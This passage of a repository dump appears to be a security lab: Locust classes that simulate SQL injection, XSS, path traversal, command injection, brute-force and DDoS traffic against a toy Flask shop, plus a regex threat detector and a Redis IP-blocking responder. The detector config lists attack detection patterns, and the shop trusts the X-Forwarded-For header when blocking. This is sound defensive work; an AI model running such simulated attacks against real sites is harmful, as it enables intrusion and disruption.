        json_logger.info(json.dumps(log_entry))

    def _log_exception(self, log_id, method, path, exception, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": 500,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "exception": str(exception),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))


enabled_user_classes = []

if config['threat_users'].get('sql_injection', {}).get('enabled', False):
    class SQLInjectionUser(DynamicMaliciousUser):
        weight = config['threat_users']['sql_injection'].get('weight', 1)
        tasks = [DynamicMaliciousUser.sql_injection_attempt]


    enabled_user_classes.append(SQLInjectionUser)

if config['threat_users'].get('xss', {}).get('enabled', False):
    class XSSUser(DynamicMaliciousUser):
        weight = config['threat_users']['xss'].get('weight', 1)
        tasks = [DynamicMaliciousUser.xss_attempt]


    enabled_user_classes.append(XSSUser)

if config['threat_users'].get('path_traversal', {}).get('enabled', False):
    class PathTraversalUser(DynamicMaliciousUser):
        weight = config['threat_users']['path_traversal'].get('weight', 1)
        tasks = [DynamicMaliciousUser.path_traversal_attempt]


    enabled_user_classes.append(PathTraversalUser)

if config['threat_users'].get('command_injection', {}).get('enabled', False):
    class CommandInjectionUser(DynamicMaliciousUser):
        weight = config['threat_users']['command_injection'].get('weight', 1)
        tasks = [DynamicMaliciousUser.command_injection_attempt]


    enabled_user_classes.append(CommandInjectionUser)

if config['threat_users'].get('brute_force', {}).get('enabled', False):
    class BruteForceUser(DynamicMaliciousUser):
        weight = config['threat_users']['brute_force'].get('weight', 1)
        tasks = [DynamicMaliciousUser.brute_force_login]


    enabled_user_classes.append(BruteForceUser)

if config['threat_users'].get('web_scraping', {}).get('enabled', False):
    class WebScrapingUser(DynamicMaliciousUser):
        weight = config['threat_users']['web_scraping'].get('weight', 1)
        tasks = [DynamicMaliciousUser.web_scraping]


    enabled_user_classes.append(WebScrapingUser)

if config['threat_users'].get('ddos', {}).get('enabled', False):
    class DDOSUser(DynamicMaliciousUser):
        weight = config['threat_users']['ddos'].get('weight', 1)
        tasks = [DynamicMaliciousUser.ddos_simulation]


    enabled_user_classes.append(DDOSUser)


def manage_user_lifecycle(environment):
    # I hate this code with a passion
    current_time = time.time()
    for user in list(user_manager.users.values()):
        if user.is_active:
            if random.random() < config['lifecycle']['deactivation_chance']:
                user.is_active = False
                user.last_active_time = current_time
                user.activation_cooldown = random.uniform(config['lifecycle']['min_cooldown'],
                                                          config['lifecycle']['max_cooldown'])
                logging.info(f"User {user.user_id} deactivated")
        elif current_time - user.last_active_time > user.activation_cooldown:
            if random.random() < config['lifecycle']['activation_chance']:
                user.is_active = True
                user.last_active_time = current_time
                logging.info(f"User {user.user_id} activated")


def log_user_stats():
    stats = user_manager.get_stats()
    log_message = "Threat User Statistics: " + ", ".join([
        f"{cls.__name__}: Spawned: {data['spawned']}, "
        f"Active: {data['active']}, "
        f"Inactive: {data['spawned'] - data['active']}"
        for cls, data in stats.items()
    ])
    user_stats_logger.info(log_message)


class CustomLoadShape(LoadTestShape):
    def __init__(self):
        super().__init__()
        self.user_count = config['threat_users'].get('count', int(os.getenv('THREAT_USERS', 2)))
        self.spawn_rate = config['threat_users'].get('spawn_rate', float(os.getenv('THREAT_SPAWN_RATE', 1)))
        self.user_classes = enabled_user_classes
        self.user_counts = self.calculate_user_counts()
        self.run_time = config.get('run_time', 3600)
        logging.info(f"CustomLoadShape initialized with user_count: {self.user_count}, spawn_rate: {self.spawn_rate}")
        logging.info(f"User distribution: {self.user_counts}")

    def calculate_user_counts(self):
        total_weight = sum(user_class.weight for user_class in self.user_classes)
        return {
            user_class: max(1, int(self.user_count * user_class.weight / total_weight))
            for user_class in self.user_classes
        }

    def tick(self):
        current_users = sum(len(user_class.instances) for user_class in self.user_classes)
        if current_users >= self.user_count:
            return self.user_count, self.spawn_rate

        return current_users + self.spawn_rate, self.spawn_rate


def periodic_tasks(environment):
    while True:
        manage_user_lifecycle(environment)
        log_user_stats()
        gevent.sleep(5)  # Log every 5 seconds


@events.init.add_listener
def on_locust_init(environment, **kwargs):
    if not isinstance(environment.runner, MasterRunner):
        logging.info(f"Initializing CustomLoadShape")
        environment.runner.shape_class = CustomLoadShape()
        gevent.spawn(periodic_tasks, environment)

================
File: logstash/logstash.conf
================
input {
  file {
    path => "/mnt/logs/locust_json.log"
    start_position => "beginning"
    codec => json
    type => "normal"
    sincedb_write_interval => "1"
    stat_interval => "1"
    discover_interval => "5"
  }
  file {
    path => "/mnt/logs/threat_locust_json.log"
    start_position => "beginning"
    codec => json
    type => "threat"
    sincedb_write_interval => "1"
    stat_interval => "1"
    discover_interval => "5"
  }
}

filter {
  date {
    match => [ "@timestamp", "ISO8601", "yyyy-MM-dd HH:mm:ss.SSS" ]
    target => "@timestamp"
  }

  mutate {
    convert => {
      "bytes_received" => "integer"
      "bytes_sent" => "integer"
      "response_time_ms" => "integer"
      "status_code" => "integer"
    }
    remove_field => [ "host" ]
  }

  if [status_code] == 403 {
    drop { }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "locust-logs-%{+YYYY.MM.dd}"
  }
  stdout { codec => rubydebug }
}

================
File: logstash/logstash.yaml
================
log.level: warn
pipeline.ecs_compatibility: v1

================
File: threat_detector/detector_config.yaml
================
# Index names
indices:
  source: locust-logs-*
  threat: threat-logs
  normal: normal-logs

# DDoS detection settings
ddos:
  threshold: 5
  time_window: 2
  max_requests: 1000

# Threat detection rules
detection_rules:
  sql_injection:
    - |-
      id=\s*['"].*?(?:--|\%27|')
    - |-
      UNION\s+SELECT
    - |-
      EXEC\s*\(
    - |-
      WAITFOR\s+DELAY
    - |-
      SELECT\s+.*?FROM
    - |-
      1\s*=\s*1
    - |-
      DROP\s+TABLE
    - |-
      ;.*?(?:SELECT|INSERT|UPDATE|DELETE|DROP)
  xss:
    - "<script>"
    - "javascript:"
    - "alert\\s*\\("
    - "on\\w+\\s*="
    - "<svg.*?on\\w+\\s*="
    - "<img.*?on\\w+\\s*="
    - "\"\\s*><script>"
    - "'\\s*><script>"
  path_traversal:
    - "\\.\\.\\/|\\.\\.\\\\"
    - "\\.\\.(\\%2f|\\%5c)"
    - "\\%2e\\%2e(\\%2f|\\%5c)"
    - "\\%252e\\%252e(\\%252f|\\%255c)"
  command_injection:
    - ";\\s*\\w+"
    - "`.*?`"
    - "\\|\\s*\\w+"
    - "\\$\\(.*?\\)"
    - "&&\\s*\\w+"
    - "\\|\\|\\s*\\w+"

# Log processing settings
processing:
  batch_size: 1000
  poll_interval: 5
  error_retry_interval: 30

# Logging configuration
logging:
  level: INFO
  file: /mnt/logs/threat_detector.log
  max_size: 10485760  # 10 MB
  backup_count: 5

# Field order for log entries
field_order:
  - log_id
  - threat_type
  - detected_threats
  - "@timestamp"
  - client_ip
  - method
  - url
  - status_code
  - response_time_ms
  - bytes_sent
  - bytes_received
  - user_agent
  - referer
  - request_headers
  - response_headers
  - geo
  - request_body

================
File: threat_detector/Dockerfile.detector
================
FROM python:3.12
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY threat_detector.py .
COPY detector_config.yaml /app/config.yaml

RUN mkdir -p /mnt/logs && chmod 777 /mnt/logs

CMD ["python", "threat_detector.py"]

================
File: threat_detector/Dockerfile.responder
================
FROM python:3.12

WORKDIR /app

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY threat_responder.py .
COPY responder_config.yaml .

CMD ["python", "threat_responder.py"]

================
File: threat_detector/requirements.txt
================
elasticsearch==8.9.0
PyYAML==6.0.2
watchdog==3.0.0
redis==5.0.1

================
File: threat_detector/responder_config.yaml
================
# Logging configuration
logging:
  level: INFO
  file: /mnt/logs/threat_responder.log
  max_size: 10485760  # 10 MB
  backup_count: 5

# Response actions for different threat types
response_actions:
  sql_injection: "block_ip"
  xss: "block_ip"
  path_traversal: "log"
  command_injection: "block_ip"
  ddos: "block_ip"
  potential_ddos: "rate_limit"
  potential_brute_force: "rate_limit"

# Redis configuration
redis:
  url: redis://redis:6379/0
  key_prefix: "threat_responder:"
  blocked_ips_key: "blocked_ips"
  expiration_time: 3600

# Rate limiting configuration
rate_limit:
  window_size: 60
  max_requests: 100

elasticsearch:
  host: elasticsearch
  port: 9200

# Index names
indices:
  threat: threat-logs

# Processing settings
processing:
  batch_size: 100
  poll_interval: 5
  error_retry_interval: 30

sync_interval: 300

================
File: threat_detector/threat_detector.py
================
import json
import re
from collections import defaultdict, deque
from datetime import datetime, timezone, timedelta
import os
import logging
import yaml
import time
import uuid
from elasticsearch import Elasticsearch, helpers
from elasticsearch.helpers import bulk

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

log_dir = '/mnt/logs'
os.makedirs(log_dir, exist_ok=True)

threat_logger = logging.getLogger('threat_logger')
threat_logger.setLevel(logging.WARNING)
file_handler = logging.FileHandler(os.path.join(log_dir, 'detected_threats.log'))
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
threat_logger.addHandler(file_handler)

threat_logger.propagate = False

class ThreatDetector:
    def __init__(self, config_path='config.yaml'):
        self.config = self.load_config(config_path)
        self.es = self.connect_to_elasticsearch()
        self.compiled_rules = self.compile_rules()
        self.request_timestamps = defaultdict(lambda: deque(maxlen=self.config['ddos']['max_requests']))
        self.last_processed_timestamp = datetime.now(timezone.utc)

    @staticmethod
    def load_config(config_path):
        with open(config_path, 'r') as f:
            return yaml.safe_load(f)

    @staticmethod
    def connect_to_elasticsearch():
        es_host = os.environ.get('ELASTICSEARCH_HOST', 'elasticsearch')
        es_port = os.environ.get('ELASTICSEARCH_PORT', '9200')
        es = Elasticsearch([f"http://{es_host}:{es_port}"])
        es.info()
        logger.info("Successfully connected to Elasticsearch")
        return es

    def compile_rules(self):
        return {
            threat_type: [re.compile(pattern, re.IGNORECASE) for pattern in patterns]
            for threat_type, patterns in self.config['detection_rules'].items()
        }

    def detect_threats(self, log_entry):
        threats = set()
        url = log_entry.get('url', '')
        method = log_entry.get('method', '')
        request_body = json.dumps(log_entry.get('request_body', {}))
        headers = json.dumps(log_entry.get('request_headers', {}))
        client_ip = log_entry.get('client_ip', '')
        timestamp = datetime.now(timezone.utc)

        content_to_check = f"{url} {request_body} {headers}"

        for threat_type, patterns in self.compiled_rules.items():
            if threat_type != "ddos" and any(pattern.search(content_to_check) for pattern in patterns):
                threats.add(threat_type)

        if method == 'POST' and '/login' in url:
            threats.add('potential_brute_force')

        if '/exec' in url and 'cmd' in url:
            threats.add('command_injection')

        # DDoS detection
        self.request_timestamps[client_ip].append(timestamp)

        self.request_timestamps[client_ip] = deque(
            filter(lambda ts: timestamp - ts <= timedelta(seconds=self.config['ddos']['time_window']),
                   self.request_timestamps[client_ip]),
            maxlen=self.config['ddos']['max_requests']
        )

        if len(self.request_timestamps[client_ip]) > self.config['ddos']['threshold']:
            threats.add('ddos')
        elif len(self.request_timestamps[client_ip]) > 1:
            threats.add('potential_ddos')

        return list(threats)

    def process_logs_stream(self):
        while True:
            query = {
                "query": {
                    "range": {
                        "@timestamp": {
                            "gt": self.last_processed_timestamp.isoformat()
                        }
                    }
                },
                "sort": [
                    {"@timestamp": "asc"}
                ]
            }

            logger.info(f"Querying for logs after {self.last_processed_timestamp.isoformat()}")

            for log in helpers.scan(self.es, query=query, index=self.config['indices']['source']):
                log_entry = log['_source']
                log_timestamp = datetime.fromisoformat(log_entry['@timestamp'].replace('Z', '+00:00'))

                if log_timestamp > self.last_processed_timestamp:
                    threats = self.detect_threats(log_entry)
                    if threats:
                        self.process_threat(log_entry, threats)
                    else:
                        self.process_normal_log(log_entry)

                    self.last_processed_timestamp = log_timestamp

            logger.info(f"Processed logs up to {self.last_processed_timestamp.isoformat()}")
            time.sleep(self.config['processing']['poll_interval'])

    def process_threat(self, log_entry, threats):
        log_entry['detected_threats'] = threats
        self.es.index(index=self.config['indices']['threat'], body=log_entry)

    def process_normal_log(self, log_entry):
        self.es.index(index=self.config['indices']['normal'], body=log_entry)

    def run(self):
        logger.info(f"Starting threat detector. Processing logs from {self.last_processed_timestamp.isoformat()}")
        self.process_logs_stream()


if __name__ == "__main__":
    detector = ThreatDetector()
    detector.run()

================
File: threat_detector/threat_responder.py
================
import json
import logging
import yaml
import time
from datetime import datetime, timedelta, timezone
from elasticsearch import Elasticsearch, helpers
import redis
import sys

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.StreamHandler(sys.stderr),
                        logging.FileHandler("/mnt/logs/threat_responder.log")
                    ])
logger = logging.getLogger(__name__)

class ThreatResponder:
    def __init__(self, config_path='responder_config.yaml'):
        logger.info("Initializing ThreatResponder")
        self.config = self.load_config(config_path)
        self.es = self.connect_to_elasticsearch()
        self.redis = self.connect_to_redis()
        self.BLOCKED_IPS_KEY = f"{self.config['redis']['key_prefix']}blocked_ips"
        self.last_processed_timestamp = datetime.now(timezone.utc)

    @staticmethod
    def load_config(config_path):
        logger.info(f"Loading config from {config_path}")
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)
        logger.info("Config loaded successfully")
        return config

    def connect_to_elasticsearch(self):
        es_host = self.config['elasticsearch']['host']
        es_port = self.config['elasticsearch']['port']
        es = Elasticsearch([f"http://{es_host}:{es_port}"])
        es.info()
        logger.info("Successfully connected to Elasticsearch")
        return es

    def connect_to_redis(self):
        redis_url = self.config['redis']['url']
        logger.info(f"Connecting to Redis at {redis_url}")
        return redis.Redis.from_url(redis_url, decode_responses=True)

    def process_threats_stream(self):
        while True:
            query = {
                "query": {
                    "range": {
                        "@timestamp": {
                            "gt": self.last_processed_timestamp.isoformat()
                        }
                    }
                },
                "sort": [
                    {"@timestamp": "asc"}
                ]
            }

            logger.info(f"Querying for threats after {self.last_processed_timestamp.isoformat()}")

            for threat in helpers.scan(self.es, query=query, index=self.config['indices']['threat']):
                threat_entry = threat['_source']
                threat_timestamp = datetime.fromisoformat(threat_entry['@timestamp'].replace('Z', '+00:00'))

                if threat_timestamp > self.last_processed_timestamp:
                    self.execute_response(threat_entry.get('detected_threats', []), threat_entry)
                    self.last_processed_timestamp = threat_timestamp

            logger.info(f"Processed threats up to {self.last_processed_timestamp.isoformat()}")
            time.sleep(self.config['processing']['poll_interval'])

    def execute_response(self, detected_threats, threat_entry):
        logger.info(f"Executing response for threats: {detected_threats}")
        client_ip = threat_entry.get('client_ip', 'unknown')

        for threat_type in detected_threats:
            if threat_type in self.config['response_actions']:
                action = self.config['response_actions'][threat_type]
                logger.info(f"Action for {threat_type}: {action}")

                if action == "block_ip":
                    self.block_ip(client_ip)
                elif action == "rate_limit":
                    self.rate_limit_ip(client_ip)
                elif action == "log":
                    self.log_threat(threat_type, client_ip)
                else:
                    logger.warning(f"Unknown action type for threat: {threat_type}")
            else:
                logger.warning(f"No response action defined for threat type: {threat_type}")

    def block_ip(self, ip):
        try:
            if not self.redis.sismember(self.BLOCKED_IPS_KEY, ip):
                self.redis.sadd(self.BLOCKED_IPS_KEY, ip)
                self.redis.expire(self.BLOCKED_IPS_KEY, self.config['redis']['expiration_time'])
                logger.info(f"Blocked IP: {ip} for {self.config['redis']['expiration_time']} seconds")
            else:
                logger.info(f"IP: {ip} is already blocked")
        except redis.exceptions.RedisError as e:
            logger.error(f"Error blocking IP: {e}")

    def rate_limit_ip(self, ip):
        logger.info(f"Rate limiting IP: {ip}")
        key = f"{self.config['redis']['key_prefix']}rate:{ip}"
        current = int(self.redis.get(key) or 0)
        if current == 0:
            self.redis.set(key, 1, ex=self.config['rate_limit']['window_size'])
        elif current < self.config['rate_limit']['max_requests']:
            self.redis.incr(key)
        else:
            self.block_ip(ip)
            logger.info(f"Rate limit exceeded for IP: {ip}. Blocking.")

    def log_threat(self, threat_type, ip):
        logger.info(f"Logging threat: {threat_type} from IP: {ip}")
        with open(self.config['logging']['file'], "a") as f:
            f.write(f"{datetime.now().isoformat()},{threat_type},{ip}\n")

    def run(self):
        logger.info(f"Starting threat responder. Processing threats from {self.last_processed_timestamp.isoformat()}")
        while True:
            try:
                self.process_threats_stream()
            except Exception as e:
                logger.error(f"An error occurred: {str(e)}")
                logger.info("Attempting to reconnect to Elasticsearch...")
                self.es = self.connect_to_elasticsearch()
                time.sleep(self.config['processing']['error_retry_interval'])


if __name__ == "__main__":
    responder = ThreatResponder()
    responder.run()

================
File: web/app.py
================
from flask import Flask, request, jsonify, abort
import psycopg2
import os
import redis
import logging
from werkzeug.exceptions import HTTPException

app = Flask(__name__)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

REDIS_URL = os.environ.get('REDIS_URL', 'redis://redis:6379/0')
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://user:password@db:5432/ecommerce')
BLOCKED_IPS_KEY = "threat_responder:blocked_ips"

def get_redis_client():
    try:
        client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
        client.ping()
        logger.info(f"Successfully connected to Redis at {REDIS_URL}")
        logger.info(f"Using blocked IPs key: {BLOCKED_IPS_KEY}")
        return client
    except redis.exceptions.ConnectionError as e:
        logger.error(f"Failed to connect to Redis: {e}")
        return None


redis_client = get_redis_client()

def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL)
    conn.autocommit = True
    return conn

def is_ip_blocked(ip):
    try:
        is_blocked = redis_client.sismember(BLOCKED_IPS_KEY, ip)
        logger.info(f"Checking if IP {ip} is blocked. Result: {is_blocked}")
        return is_blocked
    except redis.exceptions.RedisError as e:
        logger.error(f"Error checking if IP is blocked: {e}")
        return False

def get_client_ip():
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

@app.before_request
def check_if_blocked():
    client_ip = get_client_ip()
    if is_ip_blocked(client_ip):
        logger.warning(f"Blocked request from IP: {client_ip}")
        abort(403, description="Access denied")

@app.errorhandler(Exception)
def handle_exception(e):
    if isinstance(e, HTTPException):
        response = jsonify({
            "code": e.code,
            "name": e.name,
            "description": e.description,
        })
        response.status_code = e.code
    else:
        response = jsonify({
            "code": 500,
            "name": "Internal Server Error",
            "description": "An unexpected error occurred",
        })
        response.status_code = 500
    return response
@app.route('/')
def hello():
    return "Welcome to the E-commerce Platform Simulation!"

@app.route('/products')
def get_products():
    conn = get_db_connection()
    if conn is None:
        return jsonify({"error": "Database connection error"}), 500
    try:
        with conn.cursor() as cur:
            cur.execute('SELECT * FROM products;')
            products = cur.fetchall()
        return jsonify([{'id': p[0], 'name': p[1], 'price': p[2]} for p in products])
    except psycopg2.Error as e:
        logger.error(f"Database error: {e}")
        return jsonify({"error": "Database error"}), 500
    finally:
        conn.close()


@app.route('/products/<int:product_id>')
def get_product(product_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('SELECT * FROM products WHERE id = %s;', (product_id,))
    product = cur.fetchone()
    cur.close()
    conn.close()
    if product:
        return jsonify({'id': product[0], 'name': product[1], 'price': product[2]})
    return jsonify({"error": "Product not found"}), 404


@app.route('/login', methods=['POST'])
def login():
    return jsonify({"message": "Login simulation successful"})


@app.route('/cart', methods=['GET', 'POST'])
def cart():
    if request.method == 'POST':
        return jsonify({"message": "Item added to cart"})
    else:
        return jsonify({"message": "Cart viewed"})


@app.route('/checkout', methods=['POST'])
def checkout():
    return jsonify({"message": "Checkout process completed"})


@app.route('/search')
def search():
    query = request.args.get('q', '')
    return jsonify({"message": f"Search results for: {query}"})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

================
File: web/Dockerfile
================
FROM python:3.12
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY app.py .
ENV REDIS_KEY_PREFIX="threat_responder:"
CMD ["python", "app.py"]

================
File: web/requirements.txt
================
Flask==3.0.3
psycopg2-binary==2.9.9
redis==5.0.1
